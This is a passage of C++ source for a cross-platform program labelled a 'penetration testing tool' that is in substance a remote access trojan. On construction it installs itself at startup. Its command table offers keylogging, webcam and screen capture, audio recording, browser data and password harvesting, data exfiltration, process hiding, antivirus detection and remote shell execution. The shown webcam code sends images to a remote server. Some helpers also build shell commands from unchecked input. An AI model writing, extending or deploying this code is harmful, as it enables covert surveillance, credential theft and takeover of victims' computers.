        ULONG bufLen = sizeof(IP_ADAPTER_ADDRESSES);
        std::vector<char> buffer(bufLen);
        PIP_ADAPTER_ADDRESSES adapters = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());

        if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, nullptr, adapters, &bufLen) == ERROR_BUFFER_OVERFLOW) {
            buffer.resize(bufLen);
            adapters = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
        }

        if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, nullptr, adapters, &bufLen) == NO_ERROR) {
            for (PIP_ADAPTER_ADDRESSES adapter = adapters; adapter; adapter = adapter->Next) {
                if (adapter->OperStatus != IfOperStatusUp) continue;
                
                for (IP_ADAPTER_UNICAST_ADDRESS* addr = adapter->FirstUnicastAddress; addr; addr = addr->Next) {
                    if (addr->Address.lpSockaddr->sa_family == AF_INET) {
                        char ip[INET_ADDRSTRLEN];
                        sockaddr_in* sin = reinterpret_cast<sockaddr_in*>(addr->Address.lpSockaddr);
                        inet_ntop(AF_INET, &sin->sin_addr, ip, sizeof(ip));
                        
                        if (std::string(ip) != "127.0.0.1") {
                            info.localIP = ip;
                            
                            // Get MAC address
                            if (adapter->PhysicalAddressLength == 6) {
                                char mac[18];
                                sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                                         adapter->PhysicalAddress[0], adapter->PhysicalAddress[1],
                                         adapter->PhysicalAddress[2], adapter->PhysicalAddress[3],
                                         adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
                                info.macAddress = mac;
                            }
                            
                            // Get subnet
                            ULONG prefixLength = addr->OnLinkPrefixLength;
                            DWORD mask = 0xFFFFFFFF << (32 - prefixLength);
                            mask = htonl(mask);
                            struct in_addr netAddr;
                            netAddr.s_addr = sin->sin_addr.s_addr & mask;
                            char subnet[INET_ADDRSTRLEN];
                            inet_ntop(AF_INET, &netAddr, subnet, sizeof(subnet));
                            info.subnet = std::string(subnet) + "/" + std::to_string(prefixLength);
                            
                            // Get gateway
                            for (IP_ADAPTER_GATEWAY_ADDRESS* gw = adapter->FirstGatewayAddress; gw; gw = gw->Next) {
                                if (gw->Address.lpSockaddr->sa_family == AF_INET) {
                                    char gateway[INET_ADDRSTRLEN];
                                    sockaddr_in* gwSin = reinterpret_cast<sockaddr_in*>(gw->Address.lpSockaddr);
                                    inet_ntop(AF_INET, &gwSin->sin_addr, gateway, sizeof(gateway));
                                    info.gateway = gateway;
                                    break;
                                }
                            }
                            return info;
                        }
                    }
                }
            }
        }
    #else
        struct ifaddrs *ifaddr, *ifa;
        if (getifaddrs(&ifaddr) != -1) {
            for (ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
                if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
                if (!(ifa->ifa_flags & IFF_UP) || (ifa->ifa_flags & IFF_LOOPBACK)) continue;
                
                char ip[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr, ip, sizeof(ip));
                
                if (std::string(ip) != "127.0.0.1") {
                    info.localIP = ip;
                    
                    // Get MAC address
                    std::string macCmd = "cat /sys/class/net/" + std::string(ifa->ifa_name) + "/address 2>/dev/null";
                    FILE* macPipe = popen(macCmd.c_str(), "r");
                    if (macPipe) {
                        char macBuffer[32];
                        if (fgets(macBuffer, sizeof(macBuffer), macPipe)) {
                            std::string mac(macBuffer);
                            mac.erase(mac.find_last_not_of(" \n\r\t") + 1);
                            info.macAddress = mac;
                        }
                        pclose(macPipe);
                    }
                    
                    // Get netmask and calculate subnet
                    if (ifa->ifa_netmask) {
                        struct in_addr net, mask, addr;
                        inet_pton(AF_INET, ip, &addr);
                        memcpy(&mask, &((struct sockaddr_in*)ifa->ifa_netmask)->sin_addr, sizeof(mask));
                        net.s_addr = addr.s_addr & mask.s_addr;
                        
                        char network[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &net, network, sizeof(network));
                        
                        // Calculate CIDR
                        int cidr = 0;
                        uint32_t maskBits = ntohl(mask.s_addr);
                        while (maskBits) {
                            cidr += maskBits & 1;
                            maskBits >>= 1;
                        }
                        
                        info.subnet = std::string(network) + "/" + std::to_string(cidr);
                    }
                    break;
                }
            }
            freeifaddrs(ifaddr);
        }
        
        // Get gateway
        FILE* route = popen("ip route | grep default | awk '{print $3}' | head -n1", "r");
        if (route) {
            char buffer[32];
            if (fgets(buffer, sizeof(buffer), route)) {
                std::string gw(buffer);
                gw.erase(gw.find_last_not_of(" \n\r\t") + 1);
                info.gateway = gw;
            }
            pclose(route);
        }
    #endif
        return info;
    }

    // Get connected WiFi network name
    std::string getConnectedWiFi() {
    #ifdef _WIN32
        FILE* pipe = popen("netsh wlan show profiles | findstr \"All User Profile\" | for /f \"tokens=2 delims=:\" %i in ('more') do @netsh wlan show profiles \"%i\" key=clear | findstr \"SSID name\"", "r");
        if (pipe) {
            char buffer[256];
            if (fgets(buffer, sizeof(buffer), pipe)) {
                std::string result(buffer);
                size_t pos = result.find(":");
                if (pos != std::string::npos) {
                    result = result.substr(pos + 1);
                    result.erase(0, result.find_first_not_of(" \t"));
                    result.erase(result.find_last_not_of(" \n\r\t") + 1);
                    pclose(pipe);
                    return result;
                }
            }
            pclose(pipe);
        }
        return "Not connected";
    #else
        FILE* pipe = popen("iwgetid -r 2>/dev/null || nmcli -t -f active,ssid dev wifi | grep '^yes' | cut -d: -f2", "r");
        if (pipe) {
            char buffer[256];
            if (fgets(buffer, sizeof(buffer), pipe)) {
                std::string ssid(buffer);
                ssid.erase(ssid.find_last_not_of(" \n\r\t") + 1);
                pclose(pipe);
                return ssid.empty() ? "Not connected" : ssid;
            }
            pclose(pipe);
        }
        return "Not connected";
    #endif
    }

    // Get hostname for IP address
    std::string getHostname(const std::string& ip) {
        struct sockaddr_in sa;
        char hostname[256];
        
        sa.sin_family = AF_INET;
        inet_pton(AF_INET, ip.c_str(), &sa.sin_addr);
        
        if (getnameinfo((struct sockaddr*)&sa, sizeof(sa), hostname, sizeof(hostname), nullptr, 0, 0) == 0) {
            return hostname;
        }
        return "Unknown";
    }

    // Get MAC address for IP (from ARP table)
    std::string getMACForIP(const std::string& ip) {
    #ifdef _WIN32
        IPAddr ipAddr = inet_addr(ip.c_str());
        ULONG macAddr[2];
        ULONG macAddrLen = 6;
        
        if (SendARP(ipAddr, 0, macAddr, &macAddrLen) == NO_ERROR) {
            char mac[18];
            sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                     (BYTE)macAddr[0], (BYTE)(macAddr[0] >> 8),
                     (BYTE)(macAddr[0] >> 16), (BYTE)(macAddr[0] >> 24),
                     (BYTE)macAddr[1], (BYTE)(macAddr[1] >> 8));
            return mac;
        }
    #else
        std::string cmd = "arp -n " + ip + " 2>/dev/null | awk 'NR==2{print $3}'";
        FILE* pipe = popen(cmd.c_str(), "r");
        if (pipe) {
            char buffer[32];
            if (fgets(buffer, sizeof(buffer), pipe)) {
                std::string mac(buffer);
                mac.erase(mac.find_last_not_of(" \n\r\t") + 1);
                if (mac.length() == 17 && mac != "(incomplete)") {
                    pclose(pipe);
                    return mac;
                }
            }
            pclose(pipe);
        }
    #endif
        return "Unknown";
    }

    // Simple ping check
    bool pingIP(const std::string& ip) {
    #ifdef _WIN32
        std::string cmd = "ping -n 1 -w 1000 " + ip + " >nul 2>&1";
    #else
        std::string cmd = "ping -c 1 -W 1 " + ip + " >/dev/null 2>&1";
    #endif
        return system(cmd.c_str()) == 0;
    }

    // Discover devices on network
    void discoverDevices(const NetworkInfo& netInfo) {
        if (netInfo.localIP == "Unknown") {
            std::cout << "Cannot determine local IP address\n";
            return;
        }

        // Get base IP (e.g., 192.168.1.)
        std::string baseIP = netInfo.localIP.substr(0, netInfo.localIP.find_last_of('.') + 1);
        
        std::cout << "\n=== Network Device Discovery ===\n";
        std::cout << "Scanning " << baseIP << "1-254...\n";
        std::cout << "\n";
        
        std::vector<std::thread> threads;
        
        // Scan in batches to avoid overwhelming the network
        for (int start = 1; start <= 254; start += 50) {
            int end = std::min(start + 49, 254);
            
            for (int i = start; i <= end; ++i) {
                threads.emplace_back([&, i]() {
                    std::string ip = baseIP + std::to_string(i);
                    if (pingIP(ip)) {
                        std::string hostname = getHostname(ip);
                        std::string mac = getMACForIP(ip);
                        
                        std::cout << "IP: " << ip;
                        if (ip == netInfo.localIP) {
                            std::cout << " (This device)";
                        }
                        std::cout << " | Host: " << hostname << " | MAC: " << mac << "\n";
                    }
                });
            }
            
            // Wait for this batch
            for (auto& t : threads) {
                t.join();
            }
            threads.clear();
            
            // Small delay between batches
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }

    // WebView helper functions
    static std::string get_exe_path() {
    #ifdef _WIN32
        char buf[MAX_PATH];
        DWORD len = GetModuleFileNameA(NULL, buf, MAX_PATH);
        if (len == 0 || len == MAX_PATH) return std::string();
        return std::string(buf, len);
    #elif defined(__APPLE__)
        uint32_t size = 0;
        _NSGetExecutablePath(NULL, &size);
        std::vector<char> buf(size);
        if (_NSGetExecutablePath(buf.data(), &size) != 0) return std::string();
        return std::string(buf.data());
    #else
        char buf[4096];
        ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf)-1);
        if (len <= 0) return std::string();
        buf[len] = '\0';
        return std::string(buf);
    #endif
    }

    static std::string read_appended_html(const std::string &exe_path) {
        std::ifstream f(exe_path, std::ios::binary);
        if (!f) return std::string();

        f.seekg(0, std::ios::end);
        std::streamoff file_size = f.tellg();
        if (file_size <= (std::streamoff)(SIG_LEN + LEN_FIELD)) return std::string();

        const std::streamoff scan_window = std::min<std::streamoff>(file_size, 4LL * 1024 * 1024);
        f.seekg(-scan_window, std::ios::end);
        std::vector<char> buf((size_t)scan_window);
        f.read(buf.data(), buf.size());
        if (!f && !f.eof()) return std::string();

        for (std::streamoff i = (std::streamoff)buf.size() - (std::streamoff)(SIG_LEN + LEN_FIELD); i >= 0; --i) {
            if (std::memcmp(buf.data() + i, SIGNATURE, SIG_LEN) == 0) {
                uint64_t payload_len = 0;
                std::memcpy(&payload_len, buf.data() + i + SIG_LEN, LEN_FIELD);

                std::streamoff payload_offset = (file_size - (std::streamoff)buf.size()) + i + SIG_LEN + LEN_FIELD;
                if (payload_offset + (std::streamoff)payload_len > file_size) {
                    return std::string();
                }

                std::string payload;
                payload.resize((size_t)payload_len);
                f.clear();
                f.seekg(payload_offset, std::ios::beg);
                f.read(&payload[0], payload_len);
                if (!f) return std::string();

                return payload;
            }
            if (i == 0) break;
        }

        return std::string();
    }

void launch_webview() {
    // Get the executable path
    std::string exe = get_exe_path();
    if (exe.empty()) {
        exe = "client.exe"; // fallback
    }

    // Read the appended HTML
    std::string html = read_appended_html(exe);

    if (html.empty()) {
        // Use embedded HTML
        html = embedded_html;
        std::cout << "[WebView] Using embedded HTML\n";
    } else {
        std::cout << "[WebView] Found appended HTML payload (" << html.size() << " bytes)\n";
    }

    // Create and run the webview
    try {
        webview::webview w(false, nullptr);
        w.set_title("PenTool WebView");
        w.set_size(1200, 800, WEBVIEW_HINT_NONE);
        w.set_html(html);
        w.run();
    } catch (const std::exception& e) {
        std::cerr << "[WebView] Exception: " << e.what() << std::endl;
    }
}

void handle_webview(const std::vector<std::string>& args) {
    std::cout << "\n[WebView]\n";
    
    // Start remote client if not running
    if (!remote_client_running) {
        std::cout << "Starting remote client...\n";
        handle_remote({});
    }
    
    // Launch the webview
    std::cout << "Launching webview...\n";
    launch_webview();
}

// Add this to automatically launch webview when the program starts
void auto_launch_webview() {
    // Check if we should auto-launch webview
    const char* auto_launch = std::getenv("PENTOOL_AUTO_WEBVIEW");
    if (auto_launch && std::string(auto_launch) == "1") {
        // Start remote client silently
        if (!remote_client_running) {
            std::vector<std::string> empty_args;
            handle_remote(empty_args);
        }
        
        // Launch webview
        launch_webview();
    }
}

public:
    PenTool() {
        initialize_commands();
        current_dir = fs::current_path().string();
        create_directories();
        add_to_startup();
        
        #ifdef _WIN32
            WSADATA wsaData;
            WSAStartup(MAKEWORD(2, 2), &wsaData);
        #endif
    }
    
    ~PenTool() {
        cleanup();
        #ifdef _WIN32
            WSACleanup();
        #endif
    }
    
    void initialize_commands() {
        commands = {
            {"cd", [this](const auto& args) { change_directory(args); }, "Change directory"},
            {"ls", [this](const auto& args) { list_directory(args); }, "List directory contents"},
            {"pwd", [this](const auto& args) { print_working_directory(args); }, "Print working directory"},
            {"note", [this](const auto& args) { create_note(args); }, "Create a text note"},
            {"help", [this](const auto& args) { show_help(args); }, "Show help for commands"},
            {"scan", [this](const auto& args) { vulnerability_scan(args); }, "Vulnerability scanner"},
            {"sniff", [this](const auto& args) { network_sniffer(args); }, "Network sniffer"},
            {"av", [this](const auto& args) { av_detection(args); }, "Detect anti-virus software"},
            {"firewall", [this](const auto& args) { firewall_check(args); }, "Check firewall status"},
            {"startup", [this](const auto& args) { startup_programs(args); }, "List startup programs"},
            {"ps", [this](const auto& args) { running_processes(args); }, "List running processes"},
            {"bgapps", [this](const auto& args) { background_apps(args); }, "List background applications"},
            {"webcam", [this](const auto& args) { webcam_access(args); }, "Capture image from webcam"},
            {"screenshot", [this](const auto& args) { take_screenshot(args); }, "Take screenshot"},
            {"record", [this](const auto& args) { record_audio(args); }, "Record audio (10 sec)"},
            {"block", [this](const auto& args) { block_input(args); }, "Block input (on/off)"},
            {"kill", [this](const auto& args) { terminate_process(args); }, "Terminate process"},
            {"browser", [this](const auto& args) { extract_browser_data(args); }, "Extract browser data"},
            {"exfil", [this](const auto& args) { exfiltrate_data(args); }, "Exfiltrate data (http/ftp target [data])"},
            {"monitor", [this](const auto& args) { start_realtime_monitoring(args); }, "Start real-time monitoring"},
            {"show", [this](const auto& args) { show_monitoring_data(args); }, "Show monitoring data"},
            {"device", [this](const auto& args) { device_info(args); }, "Show detailed device information"},
            {"wallpaper", [this](const auto& args) { wallpaper_changer(args); }, "Change desktop wallpaper"},
            {"dump", [this](const auto& args) { enhanced_file_dump(args); }, "Enhanced file dump"},
            {"geoloc", [this](const auto& args) { geolocation_tracker(args); }, "Track geolocation via browser"},
            {"clear", [this](const auto& args) { clear_screen(args); }, "Clear screen"},
            {"exit", [this](const auto& args) { exit_tool(args); }, "Exit the tool"},
            {"volume", [this](const auto& args) { handle_volume(args); }, "Adjust volume (percentage)"},
            {"brightness", [this](const auto& args) { handle_brightness(args); }, "Adjust brightness (percentage)"},
            {"open", [this](const auto& args) { handle_open_url(args); }, "Open URL in default browser"},
            {"register", [this](const auto& args) { handle_register_app(args); }, "Launch application"},
            {"bluetooth", [this](const auto& args) { handle_bluetooth(args); }, "Bluetooth operations (scan)"},
            {"pull", [this](const auto& args) { handle_pull(args); }, "Download file or folder"},
            {"search", [this](const auto& args) { handle_search(args); }, "Search for files by name or extension"},
            {"wifi", [this](const auto& args) { handle_wifi(args); }, "Network scanner and WiFi information"},
            {"keylog", [this](const auto& args) { handle_keylog(args); }, "Keylogger to capture keystrokes (toggle)"},
            {"stream", [this](const auto& args) { handle_stream(args); }, "Start webcam streamer (use 'root stream' for elevated)"},
            {"root", [this](const auto& args) { handle_root(args); }, "Run command with elevated privileges"},
            {"sh", [this](const auto& args) { execute_system_command(args); }, "Execute system command"},
            {"zsh", [this](const auto& args) { execute_zsh_command(args); }, "Execute system command"},
            {"system_popup", [this](const auto& args) { system_popup(args); }, "Show system popup dialog"},
            {"notify", [this](const auto& args) { send_notification(args); }, "Send desktop notification"},
            {"script", [this](const auto& args) { run_script(args); }, "Run script file"},
            {"ssl", [this](const auto& args) { ssl_check(args); }, "SSL/TLS certificate check"},
            {"crawl", [this](const auto& args) { web_crawler(args); }, "Website crawling"},
            {"procmon", [this](const auto& args) { process_monitor(args); }, "Detailed live process monitoring"},
            {"task", [this](const auto& args) { manage_tasks(args); }, "Manage scheduled tasks"},
            {"driver", [this](const auto& args) { list_drivers(args); }, "List loaded drivers"},
            {"hide", [this](const auto& args) { hide_process(args); }, "Hide process from task manager"},
            {"clipboard", [this](const auto& args) { clipboard_monitor(args); }, "Monitor clipboard contents"},
            {"play", [this](const auto& args) { play_audio(args); }, "play audio on the system"},
            {"screen", [this](const auto& args) { play_video(args); }, "play video on the system"},
            {"tokens", [this](const auto& args) { list_tokens(args); }, "List available tokens (Windows)"},
            {"passwords", [this](const auto& args) { search_passwords(args); }, "Search for password files"},
            {"remote", [this](const auto& args) { handle_remote(args); }, "Connect to remote server"},
            {"live_screen", [this](const auto& args) { handle_live_screen(args); }, "Start live screen streaming"},
            {"stop_live_screen", [this](const auto& args) { handle_stop_live_screen(args); }, "Stop live screen streaming"},
            {"iot", [this](const auto& args) { detect_hardware(args); }, "Detect connected hardware devices"},
            {"webview", [this](const auto& args) { handle_webview(args); }, "Launch webview interface with remote connection"},
            {"expose", [this](const auto& args) { handle_expose(args); }, "Launch webview interface with remote connection"}
        };
    }
    
    void run() {
        std::cout << "\nADVANCED CROSS-PLATFORM PENETRATION TESTING TOOL\n";
        std::cout << "🔊 Advanced System Control Features Enabled\n";
        std::cout << "📡 Cross-platform Bluetooth support enabled\n";
        std::cout << "📶 Network scanning and WiFi information enabled\n";
        std::cout << "⌨️ Keylogger functionality enabled\n";
        std::cout << "📹 Webcam streaming functionality enabled\n";
        std::cout << "🌐 Remote server connection enabled\n";
        std::cout << "🖥️  WebView interface enabled\n";
        
        std::string ip;
        get_ip_address(ip);
        std::cout << "Your IP: " << ip << "\n";
        std::cout << "Type 'help' for available commands\n\n";
        
        // Set up signal handlers for graceful shutdown
        #ifndef _WIN32
            struct sigaction sigIntHandler;
            sigIntHandler.sa_handler = [](int s) {
                std::cout << "\nReceived interrupt signal, shutting down...\n";
                PenTool::running = false;
                exit(0);
            };
            sigemptyset(&sigIntHandler.sa_mask);
            sigIntHandler.sa_flags = 0;
            sigaction(SIGINT, &sigIntHandler, NULL);
        #endif
        
        // Main command loop
        while (PenTool::running) {
            std::cout << current_dir << "> ";
            
            std::string input;
            if (!std::getline(std::cin, input)) {
                if (std::cin.eof()) {
                    std::cout << "\nExiting...\n";
                    break;
                }
                continue;
            }
            
            if (input.empty()) {
                continue;
            }
            
            // Parse command and arguments
            std::vector<std::string> args;
            std::istringstream iss(input);
            std::string token;
            
            while (iss >> token) {
                args.push_back(token);
            }
            
            if (args.empty()) {
                continue;
            }
            
            // Add to command history
            command_history.push_back(input);
            
            // Find and execute command
            bool found = false;
            for (const auto& cmd : commands) {
                if (cmd.name == args[0]) {
                    std::vector<std::string> cmd_args(args.begin() + 1, args.end());
                    cmd.func(cmd_args);
                    found = true;
                    break;
                }
            }
            
            if (!found) {
                std::cout << "Unknown command: " << args[0] << ". Type 'help' for available commands.\n";
            }
        }
        
        cleanup();
    }
    
    // Cross-platform command execution with output capture
    std::string execute_command(const std::string& cmd) {
        std::string output;
        char buffer[128];
        
        #ifdef _WIN32
            FILE* fp = _popen(cmd.c_str(), "r");
        #else
            FILE* fp = popen(cmd.c_str(), "r");
        #endif
        
        if (fp == nullptr) {
            return "Failed to execute command";
        }
        
        while (fgets(buffer, sizeof(buffer), fp) != nullptr) {
            output += buffer;
        }
        
        #ifdef _WIN32
            _pclose(fp);
        #else
            pclose(fp);
        #endif
        
        return output;
    }

void change_directory(const std::vector<std::string>& args) {
    if (args.empty()) {
        #ifdef _WIN32
            const char* home = std::getenv("USERPROFILE");
            if (home) current_dir = home;
        #else
            const char* home = std::getenv("HOME");
            if (home) current_dir = home;
        #endif
    } else {
        try {
            fs::current_path(args[0]);
            current_dir = fs::current_path().string();
            std::cout << "Changed directory to " << current_dir << "\n";
            
            // Notify server of directory change
            send_to_server("[DIR]" + current_dir);
        } catch (const std::exception& e) {
            std::cout << "Directory not found: " << args[0] << "\n";
        }
    }
}
    
    // List directory contents
    void list_directory(const std::vector<std::string>& args) {
        std::string path = current_dir;
        if (!args.empty()) {
            if (args[0][0] == '-' && args.size() > 1) {
                path = args[1];
            } else {
                path = args[0];
            }
        }
        
        try {
            std::cout << "Contents of " << path << ":\n";
            
            for (const auto& entry : fs::directory_iterator(path)) {
                if (fs::is_directory(entry.status())) {
                    std::cout << "[DIR]  " << entry.path().filename() << "\n";
                } else {
                    try {
                        std::cout << "[FILE] " << entry.path().filename() << " (" 
                                  << fs::file_size(entry.path()) << " bytes)\n";
                    } catch (...) {
                        std::cout << "[FILE] " << entry.path().filename() << " (unknown size)\n";
                    }
                }
            }
        } catch (const std::exception& e) {
            std::cout << "Could not open directory " << path << "\n";
        }
    }
    
void print_working_directory(const std::vector<std::string>& args) {
    std::cout << current_dir << "\n";
    
    // Send directory to server
    send_to_server("[DIR]" + current_dir);
}
    
    // Create a note file
    void create_note(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: note <filename> [content]\n";
            return;
        }
        
        std::string filename = args[0];
        if (filename.find(".txt") == std::string::npos) {
            filename += ".txt";
        }
        
        std::ofstream file(filename);
        if (!file) {
            std::cout << "Failed to create note " << filename << "\n";
            return;
        }
        
        if (args.size() == 1) {
            std::cout << "Creating note '" << filename << "'. Enter your text (Ctrl+D to save):\n";
            std::string line;
            while (std::getline(std::cin, line)) {
                file << line << "\n";
            }
        } else {
            for (size_t i = 1; i < args.size(); i++) {
                file << args[i] << " ";
            }
        }
        
        file.close();
        std::cout << "Note created: " << filename << "\n";
        log_action("Created note");
    }
    
    // Show help
    void show_help(const std::vector<std::string>& args) {
        std::cout << "\nAvailable commands:\n";
        
        for (const auto& cmd : commands) {
            std::cout << std::left << std::setw(15) << cmd.name << " " << cmd.description << "\n";
        }
        
        std::cout << "\nFor detailed help on a command, type: help <command>\n";
    }
    
    // Vulnerability scanner
    void vulnerability_scan(const std::vector<std::string>& args) {
        std::cout << "\n[Vulnerability Scanner]\n";
        
        std::string ip = "127.0.0.1";
        if (!args.empty()) {
            ip = args[0];
        } else {
            get_ip_address(ip);
        }
        
        std::cout << "Scanning IP: " << ip << " (ports 1-" << PORT_SCAN_LIMIT << ")\n";
        
        #ifdef _WIN32
            WSADATA wsaData;
            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
                std::cout << "WSAStartup failed\n";
                return;
            }
        #endif
        
        for (int port = 1; port <= PORT_SCAN_LIMIT; port++) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                continue;
            }
            
            struct sockaddr_in sa;
            sa.sin_family = AF_INET;
            sa.sin_port = htons(port);
            
            #ifdef _WIN32
                sa.sin_addr.s_addr = inet_addr(ip.c_str());
            #else
                inet_pton(AF_INET, ip.c_str(), &sa.sin_addr);
            #endif
            
            // Set timeout
            struct timeval timeout;
            timeout.tv_sec = 0;
            timeout.tv_usec = 200000; // 200ms
            
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
            
            if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
                std::cout << "Port " << port << " is open\n";
            }
            
            #ifdef _WIN32
                closesocket(sock);
            #else
                close(sock);
            #endif
        }
        
        #ifdef _WIN32
            WSACleanup();
        #endif
        
        log_action("Vulnerability scan completed");
    }
    
    // Network sniffer
    void network_sniffer(const std::vector<std::string>& args) {
        std::cout << "\n[Network Sniffer]\n";
        
        std::string filter;
        if (!args.empty()) {
            filter = args[0];
        }
        
        std::cout << "Starting network sniffing (filter: " << (filter.empty() ? "none" : filter) << ")\n";
        
        #ifdef _WIN32
            std::cout << "Capturing network traffic (Windows implementation)\n";
            std::string cmd = "netsh trace start capture=yes report=no tracefile=sniff.etl " + filter;
            system(cmd.c_str());
            std::cout << "Capture started. Use 'netsh trace stop' to stop.\n";
        #else
            std::cout << "Capturing network traffic (Linux implementation)\n";
            std::string cmd = "sudo tcpdump -i any -w sniff.pcap " + filter;
            system(cmd.c_str());
        #endif
        
        log_action("Network sniffing started");
    }
    
    // AV detection
    void av_detection(const std::vector<std::string>& args) {
        std::cout << "\n[Anti-Virus Detection]\n";
        
        #ifdef _WIN32
            std::string output = execute_command("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName");
            std::cout << "Installed AV products:\n" << output << "\n";
        #else
            std::cout << "Checking for Linux security tools...\n";
            std::string output = execute_command("ps aux | grep -E 'clam|rkhunter|chkrootkit'");
            std::cout << "Security processes:\n" << output << "\n";
        #endif
        
        log_action("AV detection performed");
    }
    
    // Firewall check
    void firewall_check(const std::vector<std::string>& args) {
        std::cout << "\n[Firewall Status Check]\n";
        
        #ifdef _WIN32
            std::string output = execute_command("netsh advfirewall show allprofiles");
            std::cout << output << "\n";
        #else
            std::string output = execute_command("sudo ufw status");
            std::cout << output << "\n";
        #endif
        
        log_action("Firewall status checked");
    }

    // Get running processes
    std::vector<ProcessInfo> get_processes() {
        std::vector<ProcessInfo> processes;
        
        #ifdef _WIN32
            HANDLE hProcessSnap;
            PROCESSENTRY32 pe32;
            
            hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hProcessSnap == INVALID_HANDLE_VALUE) {
                return processes;
            }
            
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (!Process32First(hProcessSnap, &pe32)) {
                CloseHandle(hProcessSnap);
                return processes;
            }
            
            do {
                ProcessInfo info;
                info.pid = pe32.th32ProcessID;
                info.name = pe32.szExeFile;
                
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess != NULL) {
                    char username[256];
                    DWORD username_len = sizeof(username);
                    
                    if (GetUserName(username, &username_len)) {
                        info.user = username;
                    }
                    
                    CloseHandle(hProcess);
                }
                
                processes.push_back(info);
            } while (Process32Next(hProcessSnap, &pe32) && processes.size() < MAX_PROCESSES);
            
            CloseHandle(hProcessSnap);
        #else
            for (const auto& entry : fs::directory_iterator("/proc")) {
                if (processes.size() >= MAX_PROCESSES) break;
                
                try {
                    int pid = std::stoi(entry.path().filename().string());
                    
                    std::string path = "/proc/" + std::to_string(pid) + "/status";
                    std::ifstream file(path);
                    if (!file) continue;
                    
                    ProcessInfo info;
                    info.pid = pid;
                    
                    std::string line;
                    while (std::getline(file, line)) {
                        if (line.find("Name:") == 0) {
                            info.name = line.substr(5);
                            info.name.erase(0, info.name.find_first_not_of(" \t"));
                            info.name.erase(info.name.find_last_not_of(" \t") + 1);
                        }
                    }
                    
                    struct stat file_stat;
                    if (stat(path.c_str(), &file_stat) == 0) {
                        struct passwd *pw = getpwuid(file_stat.st_uid);
                        if (pw) {
                            info.user = pw->pw_name;
                        }
                    }
                    
                    processes.push_back(info);
                } catch (...) {
                    continue;
                }
            }
        #endif
        
        return processes;
    }
    
    // Running processes
    void running_processes(const std::vector<std::string>& args) {
        std::cout << "\n[Running Processes]\n";
        
        auto processes = get_processes();
        
        for (const auto& proc : processes) {
            std::cout << "PID: " << std::left << std::setw(6) << proc.pid 
                      << " | Name: " << std::setw(20) << proc.name 
                      << " | User: " << proc.user << "\n";
        }
        
        log_action("Running processes listed");
    }
    
    // Background apps
    void background_apps(const std::vector<std::string>& args) {
        std::cout << "\n[Background Applications]\n";
        
        #ifdef _WIN32
            std::string output = execute_command("tasklist /v /fo LIST");
            std::cout << output << "\n";
        #else
            std::cout << "\nRunning processes:\n";
            std::string output = execute_command("ps aux");
            std::cout << output << "\n";
        #endif
        
        log_action("Background applications listed");
    }
    

// Updated webcam_access function
void webcam_access(const std::vector<std::string>& args) {
    std::cout << "\n[Webcam Access]\n";
    
    std::string filename = "webcam_capture.jpg";
    if (!args.empty()) {
        filename = args[0];
    }

    cv::VideoCapture cap(0);
    if (!cap.isOpened()) {
        std::cout << "Error: Could not open camera.\n";
        return;
    }

    cv::Mat frame;
    cap >> frame;
    if (frame.empty()) {
        std::cout << "Error: Could not capture frame.\n";
        return;
    }

    std::vector<uchar> buffer;
    cv::imencode(".jpg", frame, buffer);
    
    // Send header
    std::string header = "[WEBCAM:" + filename + ":" + std::to_string(buffer.size()) + "]";
    if (!send_all(current_socket, header.c_str(), header.size())) {
        std::cerr << "Failed to send webcam header\n";
        return;
    }
    
    // Send image data
    if (!send_all(current_socket, reinterpret_cast<const char*>(buffer.data()), buffer.size())) {
        std::cerr << "Failed to send webcam image\n";
        return;
    }

    // Send end marker
    std::string end_marker = "[WEBCAM_END]\n";
    if (!send_all(current_socket, end_marker.c_str(), end_marker.size())) {
        std::cerr << "Failed to send webcam end marker\n";
        return;
    }

    std::cout << "Webcam image sent to server.\n";
    log_action("Webcam capture sent to server");
}

// Helper function to get PNG encoder CLSID
#ifdef _WIN32
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    
    ImageCodecInfo* pImageCodecInfo = NULL;
    
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[i].Clsid;
            free(pImageCodecInfo);
            return i;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}
#endif

void take_screenshot(const std::vector<std::string>& args) {
    std::cout << "\n[Screenshot Capture]\n";
    try {
        capture_screenshot();
        log_action("Screenshot captured and sent to server");
    } catch (const std::exception& e) {
        std::cerr << "Error capturing screenshot: " << e.what() << std::endl;
    } catch (...) {
        std::cerr << "Unknown error capturing screenshot" << std::endl;
    }
}

// Updated send_to_server function
